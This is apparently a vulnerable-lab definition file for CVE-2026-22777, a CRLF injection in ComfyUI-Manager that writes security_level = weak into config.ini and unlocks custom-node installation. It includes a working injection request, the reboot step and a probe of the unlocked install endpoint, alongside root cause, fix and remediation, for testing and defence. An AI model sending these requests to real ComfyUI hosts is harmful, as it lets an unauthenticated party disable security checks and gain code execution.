id: vt-2026-22777

info:
  name: "ComfyUI-Manager - CRLF Injection in Configuration Handler"
  author: omarkurt
  description: |
    ComfyUI-Manager, the official extension manager for ComfyUI, writes values taken
    from HTTP query parameters into its config.ini without removing carriage return or
    newline characters. Versions prior to 3.39.2, and 4.0.0 through 4.0.4, let an
    unauthenticated attacker add arbitrary keys to the configuration, for example
    security_level = weak. After a restart this disables the Manager's security checks,
    and installing a custom node from a git URL then leads to remote code execution.
    The flaw is an incomplete fix of CVE-2025-67303.
  type: CVE
  targets:
    - comfyui
    - comfyui-manager
  cve: CVE-2026-22777
  cwe: CWE-93
  cvss:
    score: 7.5
    severity: high
    metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
  affected_versions:
    - "< 3.39.2"
    - ">= 4.0.0, < 4.0.5"
  fixed_version: "3.39.2"
  tags:
    - crlf
    - config-injection
    - unauthenticated
    - comfyui
    - comfyui-manager
    - ai
    - python
    - cve-2026
  references:
    - https://vulnerabletarget.com/VT-2026-22777
    - https://nvd.nist.gov/vuln/detail/CVE-2026-22777
    - https://github.com/Comfy-Org/ComfyUI-Manager/security/advisories/GHSA-562r-8445-54r2
    - https://github.com/Comfy-Org/ComfyUI-Manager/commit/f4fa394e0f03b013f1068c96cff168ad10bd0410
    - https://github.com/vulhub/vulhub/tree/master/comfyui/CVE-2026-22777
    - https://github.com/projectdiscovery/nuclei-templates/pull/17692

vulnerabilities:
  - id: db_mode_crlf_injection
    name: "CRLF injection into config.ini via db_mode value"
    description: |
      The db_mode endpoint stores the value parameter in config.ini as-is. A URL-encoded
      carriage return (%0D) ends the db_mode line, so the rest of the value is read back
      as a new key. Here it sets security_level = weak. The endpoint is served under
      both /manager/db_mode and /api/manager/db_mode.
    endpoint: /api/manager/db_mode
    method: GET
    param: value
    request: |
      GET /api/manager/db_mode?value=cache%0Dsecurity_level%20=%20weak HTTP/1.1
      Host: {{Hostname}}
    response: |
      HTTP/1.1 200 OK
      Content-Length: 0
      Server: Python/3.13 aiohttp/3.13.3
  - id: security_gate_bypass
    name: "High-risk install endpoint unlocked after restart"
    description: |
      The injected key takes effect when the Manager reloads its configuration, which the
      unauthenticated reboot endpoint triggers. Before the injection, installing a custom
      node from a git URL is refused with 403 {"error": "security_level"}. Afterwards the
      Manager accepts the request and tries to install the given URL. Pointing it at an
      attacker-controlled repository runs that node's code on the server.
    endpoint: /api/customnode/install/git_url
    method: POST
    request: |
      POST /api/customnode/install/git_url HTTP/1.1
      Host: {{Hostname}}
      Content-Type: text/plain

      file:///nonexistent-vt-probe
    response: |
      HTTP/1.1 400 Bad Request
      Content-Length: 0

technical: |
  write_config() in glob/manager_core.py writes the in-memory configuration, including
  the db_mode value supplied by the client, to __manager/config.ini with configparser.
  In 3.39.1 the value is not sanitised, so

    GET /api/manager/db_mode?value=cache%0Dsecurity_level%20=%20weak

  produces the line "db_mode = cache\rsecurity_level = weak". Python opens the file with
  universal newlines, so on the next read the carriage return splits it into two
  entries. The Manager reads the file with ConfigParser(strict=False), and the later
  security_level = weak overrides security_level = normal.

  is_allowed_security_level('high') in glob/manager_server.py only returns True for
  security_level = weak when ComfyUI listens on a non-local address (--listen), which
  is the case in this lab. High-risk operations, such as installing a custom node from
  an arbitrary git URL or via pip, then become available without authentication.
  GET /api/manager/reboot restarts the server, so the attacker does not need to wait
  for an operator to restart it.

  The fix (commit f4fa394, 3.39.2) strips \r, \n and \0 from every string value before
  writing the file.

impact: |
  An unauthenticated attacker who can reach the ComfyUI web port can rewrite the
  Manager's security settings and restart the server. Combined with the unlocked custom
  node installation this gives remote code execution as the ComfyUI process, the same
  chain as CVE-2025-67303. ComfyUI hosts often hold GPU resources, models and API keys.

remediation:
  - "Update ComfyUI-Manager to 3.39.2 or 4.0.5 or later"
  - "Do not expose ComfyUI to untrusted networks; drop --listen or put it behind an authenticating reverse proxy"
  - "Check __manager/config.ini for unexpected keys or carriage returns and reset security_level"

poc:
  nuclei:
    - "vt-2026-22777.nuclei.yaml"

providers:
  docker-compose:
    path: "docker-compose.yaml"

post-install:
  - "Access ComfyUI at http://localhost:8188 (ready in about 15 seconds)"
  - "The image is amd64 only; on Apple Silicon it runs under emulation"
  - "Check the Manager version: GET /api/manager/version returns V3.39.1"
  - "The lab covers the configuration injection and the security gate bypass; the RCE step (installing a malicious custom node) is described but not shipped"
